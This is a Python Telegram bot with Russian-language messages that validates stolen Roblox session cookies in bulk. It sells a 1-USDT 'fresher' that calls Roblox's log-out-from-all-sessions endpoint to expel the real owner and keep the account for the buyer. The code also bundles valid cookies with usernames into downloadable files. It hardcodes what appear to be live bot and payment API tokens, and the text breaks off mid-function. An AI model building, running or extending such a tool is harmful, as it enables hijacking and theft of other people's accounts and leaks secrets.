import os
import logging
import re
import random
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import requests
import json
from datetime import datetime, timedelta

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "8204086100:AAFmfYGPLqtBpSpJk1FgyCwU87l6K2ZieTo"
CRYPTO_BOT_TOKEN = "470734:AAKKe0DuwX6a5WvXEUnsGGBrRSbyN3YJvxH"
CRYPTO_BOT_API_URL = "https://pay.crypt.bot/api/"
ADMIN_USERNAME = "@pirkw"

logging.basicConfig(level=logging.INFO)

class CryptoPayment:
    def __init__(self):
        self.api_url = CRYPTO_BOT_API_URL
        self.token = CRYPTO_BOT_TOKEN
        self.headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
    
    async def create_invoice(self, amount: float, description: str, user_id: int):
        """–°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω–≤–æ–π—Å–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã —Ñ—Ä–µ—à–µ—Ä–∞"""
        try:
            payload = {
                'asset': 'USDT',
                'amount': str(amount),
                'description': description,
                'hidden_message': f'–û–ø–ª–∞—Ç–∞ —Ñ—Ä–µ—à–µ—Ä–∞ –¥–ª—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è {user_id}',
                'paid_btn_name': 'viewItem',
                'paid_btn_url': 'https://t.me/your_bot',
                'payload': str(user_id),
                'allow_comments': False,
                'allow_anonymous': False,
                'expires_in': 86400,
            }
            
            response = requests.post(
                f"{self.api_url}createInvoice",
                headers=self.headers,
                json=payload,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok'):
                    return True, data['result']
                else:
                    return False, f"–û—à–∏–±–∫–∞ API: {data.get('error', 'Unknown error')}"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ —Å–æ–∑–¥–∞–Ω–∏—è –∏–Ω–≤–æ–π—Å–∞: {str(e)}"
    
    async def check_invoice_status(self, invoice_id: int):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –∏–Ω–≤–æ–π—Å–∞"""
        try:
            response = requests.get(
                f"{self.api_url}getInvoices?invoice_ids={invoice_id}",
                headers=self.headers,
                timeout=30
            )
            
            if response.status_code == 200:
                data = response.json()
                if data.get('ok') and data['result']['items']:
                    invoice = data['result']['items'][0]
                    return True, invoice
                else:
                    return False, "–ò–Ω–≤–æ–π—Å –Ω–µ –Ω–∞–π–¥–µ–Ω"
            else:
                return False, f"HTTP –æ—à–∏–±–∫–∞: {response.status_code}"
                
        except Exception as e:
            return False, f"–û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Å—Ç–∞—Ç—É—Å–∞: {str(e)}"

class RobloxCookieChecker:
    def __init__(self):
        self.valid_count = 0
        self.checked_count = 0
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0'
        ]
        self.user_cookies = {}
        self.premium_users = {}
        self.crypto_payment = CryptoPayment()
        self.fresher_price = 1.0
        
    def get_random_user_agent(self):
        return random.choice(self.user_agents)
    
    def make_robust_request(self, url, headers, max_retries=3):
        for attempt in range(max_retries):
            try:
                response = requests.get(url, headers=headers, timeout=15)
                if response.status_code == 429:
                    wait_time = (2 ** attempt) + random.uniform(1, 3)
                    print(f"‚ö†Ô∏è Rate limit hit, waiting {wait_time:.1f}s...")
                    time.sleep(wait_time)
                    continue
                return response
            except requests.exceptions.RequestException as e:
                print(f"‚ö†Ô∏è Request error (attempt {attempt + 1}): {e}")
                if attempt < max_retries - 1:
                    wait_time = (2 ** attempt) + random.uniform(1, 2)
                    time.sleep(wait_time)
        return None

    def activate_premium(self, user_id):
        """–ê–∫—Ç–∏–≤–∞—Ü–∏—è –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—Ä–µ—à–µ—Ä—É"""
        self.premium_users[user_id] = {
            'activated_date': datetime.now(),
            'is_active': True,
            'payment_method': 'cryptobot'
        }

    def check_premium_access(self, user_id):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ—Ä–µ—à–µ—Ä—É"""
        return user_id in self.premium_users and self.premium_users[user_id]['is_active']

    def extract_cookies_from_text(self, text):
        """–ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –∫—É–∫–∏ –∏–∑ —Ç–µ–∫—Å—Ç–∞"""
        cookies = []
        
        # –£–ª—É—á—à–µ–Ω–Ω—ã–π –ø–∞—Ç—Ç–µ—Ä–Ω –¥–ª—è –ø–æ–∏—Å–∫–∞ –∫—É–∫–∏
        patterns = [
            r'_\|WARNING:-DO-NOT-SHARE-THIS\.--[^\\s]+.*?(?=\\s|$)',
            r'_\|WARNING:-DO-NOT-SHARE-THIS[^\\s]+',
            r'ROBLOSECURITY=[^\\s]+',
        ]
        
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                cookie_candidate = match.strip()
                if len(cookie_candidate) > 50 and '_|WARNING:-DO-NOT-SHARE-THIS' in cookie_candidate:
                    cookies.append(cookie_candidate)
                    print(f"üîç –ù–∞–π–¥–µ–Ω–∞ –∫—É–∫–∏: {cookie_candidate[:80]}...")
        
        # –ï—Å–ª–∏ –Ω–µ –Ω–∞—à–ª–∏ –ø–æ –ø–∞—Ç—Ç–µ—Ä–Ω–∞–º, –ø—Ä–æ–≤–µ—Ä—è–µ–º –≤–µ—Å—å —Ç–µ–∫—Å—Ç –∫–∞–∫ –∫—É–∫–∏
        if not cookies:
            clean_text = text.strip()
            if (len(clean_text) > 300 and 
                '_|WARNING:-DO-NOT-SHARE-THIS' in clean_text):
                cookies.append(clean_text)
                print(f"üîç –ù–∞–π–¥–µ–Ω–∞ —á–∏—Å—Ç–∞—è –∫—É–∫–∏: {clean_text[:80]}...")
        
        return cookies

    def clean_cookie_string(self, cookie_data):
        """–û—á–∏—Å—Ç–∫–∞ –∫—É–∫–∏"""
        # –£–±–∏—Ä–∞–µ–º –ª–∏—à–Ω–∏–µ –ø—Ä–æ–±–µ–ª—ã –∏ –ø–µ—Ä–µ–Ω–æ—Å—ã
        cleaned = re.sub(r'\s+', ' ', cookie_data.strip())
        # –£–±–∏—Ä–∞–µ–º –≤–æ–∑–º–æ–∂–Ω—ã–µ –ø—Ä–µ—Ñ–∏–∫—Å—ã
        cleaned = re.sub(r'^(cookie:|üç™|üîê)\s*', '', cleaned, flags=re.IGNORECASE)
        return cleaned

    def refresh_cookie_properly(self, cookie_data):
        """–ü—Ä–∞–≤–∏–ª—å–Ω—ã–π —Ñ—Ä–µ—à –∫—É–∫–∏ - –≤—ã–∫–∏–¥—ã–≤–∞–µ—Ç –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π"""
        try:
            cookie_clean = self.clean_cookie_string(cookie_data)
            
            # –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º –∫—É–∫–∏ –¥–ª—è –∑–∞–≥–æ–ª–æ–≤–∫–∞
            if not cookie_clean.startswith('.ROBLOSECURITY='):
                cookie_header = f'.ROBLOSECURITY={cookie_clean}'
            else:
                cookie_header = cookie_clean
            
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_header,
                'Content-Type': 'application/json',
                'Accept': 'application/json',
                'Referer': 'https://www.roblox.com/',
                'Origin': 'https://www.roblox.com'
            }
            
            # –°–Ω–∞—á–∞–ª–∞ –ø–æ–ª—É—á–∞–µ–º X-CSRF-TOKEN
            token_url = 'https://auth.roblox.com/v2/login'
            token_response = requests.post(token_url, headers=headers, timeout=10)
            
            csrf_token = None
            if 'x-csrf-token' in token_response.headers:
                csrf_token = token_response.headers['x-csrf-token']
            elif token_response.status_code == 403:
                # –ü—Ä–æ–±—É–µ–º –ø–æ–ª—É—á–∏—Ç—å —Ç–æ–∫–µ–Ω –¥—Ä—É–≥–∏–º —Å–ø–æ—Å–æ–±–æ–º
                csrf_token = self.get_csrf_token(cookie_header)
            
            if not csrf_token:
                return False, cookie_data, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å CSRF token"
            
            # –î–æ–±–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω –≤ –∑–∞–≥–æ–ª–æ–≤–∫–∏
            headers['X-CSRF-TOKEN'] = csrf_token
            
            # –î–µ–ª–∞–µ–º –∑–∞–ø—Ä–æ—Å –Ω–∞ –≤—ã—Ö–æ–¥ —Å–æ –≤—Å–µ—Ö —É—Å—Ç—Ä–æ–π—Å—Ç–≤ (—ç—Ç–æ –≤—ã–∫–∏–Ω–µ—Ç –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
            logout_all_url = 'https://www.roblox.com/authentication/logoutfromallsessions'
            response = requests.post(logout_all_url, headers=headers, timeout=10)
            
            if response.status_code == 200:
                # –ü–æ–ª—É—á–∞–µ–º –Ω–æ–≤—É—é –∫—É–∫–∏ –∏–∑ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤
                if 'set-cookie' in response.headers:
                    new_cookies = response.headers['set-cookie']
                    # –ò—â–µ–º –Ω–æ–≤—É—é –∫—É–∫–∏ ROBLOSECURITY
                    roblosecurity_match = re.search(r'\.ROBLOSECURITY=([^;]+)', new_cookies)
                    if roblosecurity_match:
                        new_cookie = roblosecurity_match.group(1)
                        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —á—Ç–æ –Ω–æ–≤–∞—è –∫—É–∫–∏ –≤–∞–ª–∏–¥–Ω–∞
                        is_valid, _, _, username, _ = self.simple_cookie_validation(new_cookie)
                        if is_valid:
                            return True, new_cookie, f"‚úÖ –ö—É–∫–∏ —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª–µ–Ω–∞! –í—Å–µ –¥—Ä—É–≥–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–∏ –≤—ã–∫–∏–Ω—É—Ç—ã —Å –∞–∫–∫–∞—É–Ω—Ç–∞. –î–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ —É –≤–∞—Å."
                        else:
                            return False, cookie_data, "‚ùå –ù–æ–≤–∞—è –∫—É–∫–∏ –Ω–µ –ø—Ä–æ—à–ª–∞ –≤–∞–ª–∏–¥–∞—Ü–∏—é"
            
            return False, cookie_data, "‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –æ–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏"
            
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –∫—É–∫–∏: {e}")
            return False, cookie_data, f"‚ùå –û—à–∏–±–∫–∞: {str(e)}"

    def get_csrf_token(self, cookie_header):
        """–ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–π —Å–ø–æ—Å–æ–± –ø–æ–ª—É—á–µ–Ω–∏—è CSRF token"""
        try:
            headers = {
                'User-Agent': self.get_random_user_agent(),
                'Cookie': cookie_header,
            }
            
            # –ü—Ä–æ–±—É–µ–º —Ä–∞–∑–Ω—ã–µ —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ–∫–µ–Ω–∞
            endpoints = [
                'https://www.roblox.com/my/account',
                'https://www.roblox.com/home',
                'https://www.roblox.com/users/profile'
            ]
            
            for endpoint in endpoints:
                response = requests.get(endpoint, headers=headers, timeout=10)
                if 'x-csrf-token' in response.headers:
                    return response.headers['x-csrf-token']
            
            return None
        except:
            return None

    def simple_cookie_validation(self, cookie_data):
        """–ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏"""
        self.checked_count += 1
        cookie_clean = self.clean_cookie_string(cookie_data)
        
        if not cookie_clean.startswith('.ROBLOSECURITY='):
            cookie_string = f'.ROBLOSECURITY={cookie_clean}'
        else:
            cookie_string = cookie_clean
        
        user_agent = self.get_random_user_agent()
        headers = {
            'User-Agent': user_agent,
            'Cookie': cookie_string,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com'
        }
        
        time.sleep(random.uniform(1, 3))
        
        try:
            api_url = 'https://users.roblox.com/v1/users/authenticated'
            response = self.make_robust_request(api_url, headers)
            
            if response and response.status_code == 200:
                user_data = response.json()
                if 'id' in user_data and user_data['id'] > 0:
                    username = user_data.get('name', 'Unknown')
                    user_id = user_data['id']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
                
            mobile_headers = headers.copy()
            mobile_headers['User-Agent'] = 'Roblox/iOS'
            mobile_url = 'https://www.roblox.com/mobileapi/userinfo'
            mobile_response = self.make_robust_request(mobile_url, mobile_headers)
            
            if mobile_response and mobile_response.status_code == 200:
                mobile_data = mobile_response.json()
                if 'UserID' in mobile_data and mobile_data['UserID'] > 0:
                    username = mobile_data.get('UserName', 'Unknown')
                    user_id = mobile_data['UserID']
                    self.valid_count += 1
                    return True, cookie_clean, f"‚úÖ VALID - User: {username} (ID: {user_id})", username, user_id
            
            home_response = self.make_robust_request('https://www.roblox.com/home', headers)
            
            if home_response and home_response.status_code == 200:
                current_url = home_response.url.lower()
                if 'login' not in current_url and 'signup' not in current_url:
                    self.valid_count += 1
                    return True, cookie_clean, "‚úÖ VALID - Home page access", "Unknown", "Unknown"
        
        except Exception as e:
            print(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: {e}")
            return False, cookie_clean, f"‚ùå ERROR - {str(e)}", "Unknown", "Unknown"
        
        return False, cookie_clean, "‚ùå INVALID - All checks failed", "Unknown", "Unknown"

    def process_multiple_cookies(self, text, user_id):
        """–û–±—Ä–∞–±–æ—Ç–∫–∞ –º–Ω–æ–∂–µ—Å—Ç–≤–µ–Ω–Ω—ã—Ö –∫—É–∫–∏"""
        cookies = self.extract_cookies_from_text(text)
        valid_cookies = []
        invalid_cookies = []
        results = []
        
        print(f"üîç –ù–∞–π–¥–µ–Ω–æ –∫—É–∫–∏ –≤ —Ç–µ–∫—Å—Ç–µ: {len(cookies)}")
        
        total = len(cookies)
        if total == 0:
            return [], [], "‚ùå –í —Ç–µ–∫—Å—Ç–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ –Ω–∏ –æ–¥–Ω–æ–π –∫—É–∫–∏"
        
        self.user_cookies[user_id] = {
            'all_cookies': cookies,
            'valid_cookies': [],
            'invalid_cookies': [],
            'usernames': [],
            'user_ids': []
        }
        
        for i, cookie in enumerate(cookies, 1):
            print(f"üîç –ü—Ä–æ–≤–µ—Ä—è—é –∫—É–∫–∏ {i}/{total}")
            is_valid, clean_cookie, status, username, user_id_val = self.simple_cookie_validation(cookie)
            
            if is_valid:
                valid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['valid_cookies'].append(clean_cookie)
                self.user_cookies[user_id]['usernames'].append(username)
                self.user_cookies[user_id]['user_ids'].append(user_id_val)
                results.append(f"‚úÖ {i}/{total}: {status}")
            else:
                invalid_cookies.append(clean_cookie)
                self.user_cookies[user_id]['invalid_cookies'].append(clean_cookie)
                results.append(f"‚ùå {i}/{total}: {status}")
        
        return valid_cookies, invalid_cookies, "\n".join(results)

    def create_individual_files(self, user_id):
        if user_id not in self.user_cookies:
            return None
        
        user_data = self.user_cookies[user_id]
        valid_cookies = user_data['valid_cookies']
        usernames = user_data['usernames']
        
        if not valid_cookies:
            return None
        
        import zipfile
        timestamp = datetime.now().strftime("%H%M%S")
        zip_filename = f"individual_cookies_{user_id}_{timestamp}.zip"
        
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for i, (cookie, username) in enumerate(zip(valid_cookies, usernames), 1):
                safe_username = re.sub(r'[^\w\-_]', '_', username)
                filename = f"cookie_{i}_{safe_username}.txt"
                
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(cookie)
                
                zipf.write(filename, filename)
                os.remove(filename)
        
        return zip_filename

    def get_command_keyboard(self):
        """–ö–ª–∞–≤–∏–∞—Ç—É—Ä–∞ —Å –∫–æ–º–∞–Ω–¥–∞–º–∏"""
        keyboard = [
            [InlineKeyboardButton("üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫—É–∫–∏", callback_data="check_cookies"),
             InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="show_stats")],
            [InlineKeyboardButton("üîÑ –§—Ä–µ—à–µ—Ä –∫—É–∫–∏", callback_data="fresher_info"),
             InlineKeyboardButton("‚ÑπÔ∏è –ü–æ–º–æ—â—å", callback_data="help_command")]
        ]
        return InlineKeyboardMarkup(keyboard)

checker = RobloxCookieChecker()

async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é –±–æ—Ç–∞"""
    menu_text = """
ü§ñ –ë–û–¢ –ü–†–û–í–ï–†–ö–ò ROBLOX –ö–£–ö–ò

üéØ –î–æ—Å—Ç—É–ø–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏:

üîç –ü–†–û–í–ï–†–ö–ê –ö–£–ö–ò - –ë–ï–°–ü–õ–ê–¢–ù–û
‚Ä¢ –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤–∞–ª–∏–¥–Ω–æ—Å—Ç–∏ –∫—É–∫–∏
‚Ä¢ –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
‚Ä¢ –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –∞–∫–∫–∞—É–Ω—Ç–∞

üîÑ –§–†–ï–®–ï–† –ö–£–ö–ò - 1 USDT
‚Ä¢ –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ –∫—É–∫–∏ (–≤—ã–∫–∏–¥—ã–≤–∞–µ—Ç –≤—Å–µ—Ö –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π)
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ —É –≤–∞—Å
‚Ä¢ –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –≤–∞–ª–∏–¥–Ω—É—é —Ñ—Ä–µ—à–Ω—É—Ç—É—é –∫—É–∫–∏

üí° –ü—Ä–æ—Å—Ç–æ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∫—É–∫–∏ –¥–ª—è –±–µ—Å–ø–ª–∞—Ç–Ω–æ–π –ø—Ä–æ–≤–µ—Ä–∫–∏!
    """
    
    if hasattr(update, 'message'):
        await update.message.reply_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )
    else:
        await update.edit_message_text(
            menu_text,
            reply_markup=checker.get_command_keyboard()
        )

async def show_fresher_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ñ—Ä–µ—à–µ—Ä–µ"""
    user_id = update.effective_user.id
    has_premium = checker.check_premium_access(user_id)
    
    if has_premium:
        fresher_text = """
üîÑ –§–†–ï–®–ï–† –ö–£–ö–ò - –ê–ö–¢–ò–í–ï–ù

‚úÖ –£ –≤–∞—Å –µ—Å—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Ñ—Ä–µ—à–µ—Ä—É!

–§—É–Ω–∫—Ü–∏–∏ —Ñ—Ä–µ—à–µ—Ä–∞:
‚Ä¢ –û–±–Ω–æ–≤–ª—è–µ—Ç –≤–∞–ª–∏–¥–Ω—ã–µ –∫—É–∫–∏
‚Ä¢ –í—ã–∫–∏–¥—ã–≤–∞–µ—Ç –í–°–ï–• –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø —Ç–æ–ª—å–∫–æ —É –≤–∞—Å
‚Ä¢ –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç 100% –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏

–ö–∞–∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å:
1. –û—Ç–ø—Ä–∞–≤—å—Ç–µ –≤–∞–ª–∏–¥–Ω—É—é –∫—É–∫–∏ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏
2. –ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ –Ω–∞–∂–º–∏—Ç–µ "üîÑ –û–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏"
3. –ü–æ–ª—É—á–∏—Ç–µ —Ñ—Ä–µ—à–Ω—É—Ç—É—é –∫—É–∫–∏ —Ñ–∞–π–ª–æ–º
        """
        keyboard = [
            [InlineKeyboardButton("üîç –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –∫—É–∫–∏", callback_data="check_cookies")],
            [InlineKeyboardButton("üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data="main_menu")]
        ]
    else:
        fresher_text = f"""
üîÑ –§–†–ï–®–ï–† –ö–£–ö–ò - 1 USDT

üî• –ú–û–©–ù–´–ô –§–†–ï–®–ï–†:
‚Ä¢ –û–±–Ω–æ–≤–ª—è–µ—Ç –í–ê–õ–ò–î–ù–´–ï –∫—É–∫–∏
‚Ä¢ –í—ã–∫–∏–¥—ã–≤–∞–µ—Ç –í–°–ï–• –¥—Ä—É–≥–∏—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π —Å –∞–∫–∫–∞—É–Ω—Ç–∞
‚Ä¢ –û—Å—Ç–∞–≤–ª—è–µ—Ç –¥–æ—Å—Ç—É–ø –¢–û–õ–¨–ö–û —É –≤–∞—Å
‚Ä¢ –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç 100% –≤–∞–ª–∏–¥–Ω—É—é —Ñ—Ä–µ—à–Ω—É—Ç—É—é –∫—É–∫–∏

üí≥ –°—Ç–æ–∏–º–æ—Å—Ç—å: 1 USDT (‚âà75‚ÇΩ)

–î–ª—è –∞–∫—Ç–∏–≤–∞—Ü–∏–∏ —Ñ—Ä–µ—à–µ—Ä–∞ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ –æ–ø–ª–∞—Ç—É.
        """
        keyboard = [
            [InlineKeyboardButton("üíé –ö—É–ø–∏—Ç—å —Ñ—Ä–µ—à–µ—Ä –∑–∞ 1 USDT", callback_data="buy_fresher")],
            [InlineKeyboardButton("üîç –ë–µ—Å–ø–ª–∞—Ç–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞", callback_data="check_cookies")],
            [InlineKeyboardButton("üîô –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é", callback_data="main_menu")]
        ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    if hasattr(update, 'message'):
        await update.message.reply_text(fresher_text, reply_markup=reply_markup)
    else:
        await update.edit_message_text(fresher_text, reply_markup=reply_markup)

async def create_payment_invoice(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """–°–æ–∑–¥–∞–Ω–∏–µ –∏–Ω–≤–æ–π—Å–∞ –¥–ª—è –æ–ø–ª–∞—Ç—ã —Ñ—Ä–µ—à–µ—Ä–∞"""
    amount = checker.fresher_price
    
    success, result = await checker.crypto_payment.create_invoice(
        amount=amount,
        description="–î–æ—Å—Ç—É–ø –∫ —Ñ—Ä–µ—à–µ—Ä—É –∫—É–∫–∏",
        user_id=user_id
    )
    
    if success:
        invoice_url = result['pay_url']
        invoice_id = result['invoice_id']
        
        payment_text = f"""
üíé –û–ü–õ–ê–¢–ê –§–†–ï–®–ï–†–ê

–°—É–º–º–∞: {amount} USDT (‚âà75‚ÇΩ)
–°–µ—Ç—å: TRC-20 (Tron)

–î–ª—è –æ–ø–ª–∞—Ç—ã:
1. –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É "–ü–µ—Ä–µ–π—Ç–∏ –∫ –æ–ø–ª–∞—Ç–µ"
2. –û–ø–ª–∞—Ç–∏—Ç–µ {amount} USDT
3. –°–¥–µ–ª–∞–π—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç –æ–ø–ª–∞—Ç—ã
4. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–∫—Ä–∏–Ω—à–æ—Ç {ADMIN_USERNAME}

–ü–æ—Å–ª–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ñ—Ä–µ—à–µ—Ä –±—É–¥–µ—Ç –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!
        """
        
        keyboard = [
            [InlineKeyboardButton("üîó –ü–µ—Ä–µ–π—Ç–∏ –∫ –æ–ø–ª–∞—Ç–µ", url=invoice_url)],
            [InlineKeyboardButton("üì∏ –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç", url=f"https://t.me/{ADMIN_USERNAME[1:]}")],
            [InlineKeyboardButton("üîÑ –ü—Ä–æ–≤–µ—Ä–∏—Ç—å –æ–ø–ª–∞—Ç—É", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton("üîô –ù–∞–∑–∞–¥", callback_data="fresher_info")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if hasattr(update, 'message'):
            await update.message.reply_text(payment_text, reply_markup=reply_markup)
        else:
            await update.edit_message_text(payment_text, reply_markup=reply_markup)
    else:
        error_text = f"""
‚ùå –û–®–ò–ë–ö–ê –°–û–ó–î–ê–ù–ò–Ø –°–ß–ï–¢–ê

–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —Å—á–µ—Ç –¥–ª—è –æ–ø–ª–∞—Ç—ã.
–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ –∏–ª–∏ —Å–≤—è–∂–∏—Ç–µ—Å—å —Å {ADMIN_USERNAME}

–û—à–∏–±–∫–∞: {result}
        """
        await update.edit_message_text(error_text)

async def send_check_results(update, user_id, valid_cookies, invalid_cookies, process_results):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –ø—Ä–æ–≤–µ—Ä–∫–∏"""
    has_premium = checker.check_premium_access(user_id)
    
    summary = f"""
üìã –†–ï–ó–£–õ–¨–¢–ê–¢–´ –ü–†–û–í–ï–†–ö–ò:

‚Ä¢ –í—Å–µ–≥–æ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–æ: {len(valid_cookies) + len(invalid_cookies)}
‚Ä¢ ‚úÖ –í–∞–ª–∏–¥–Ω—ã—Ö: {len(valid_cookies)}
‚Ä¢ ‚ùå –ù–µ–≤–∞–ª–∏–¥–Ω—ã—Ö: {len(invalid_cookies)}
‚Ä¢ üìä –£—Å–ø–µ—Ö: {len(valid_cookies)/(len(valid_cookies) + len(invalid_cookies))*100:.1f}%

{'üíé –°—Ç–∞—Ç—É—Å: –§—Ä–µ—à–µ—Ä –¥–æ—Å—Ç—É–ø–µ–Ω' if has_premium else 'üí° –§—Ä–µ—à–µ—Ä: 1 USDT'}
    """
    
    keyboard = [
        [InlineKeyboardButton("üìÅ –†–∞—Å–ø—Ä–µ–¥–µ–ª–∏—Ç—å –ø–æ —Ñ–∞–π–ª–∞–º", callback_data="distribute_files")],
        [InlineKeyboardButton("üì¶ –°–∫–∞—á–∞—Ç—å –æ–±—â–∏–π —Ñ–∞–π–ª", callback_data="download_combined")]
    ]
    
    if has_premium and valid_cookies:
        keyboard.append([InlineKeyboardButton("üîÑ –û–±–Ω–æ–≤–∏—Ç—å –∫—É–∫–∏", callback_data="refresh_cookies")])
    elif valid_cookies:
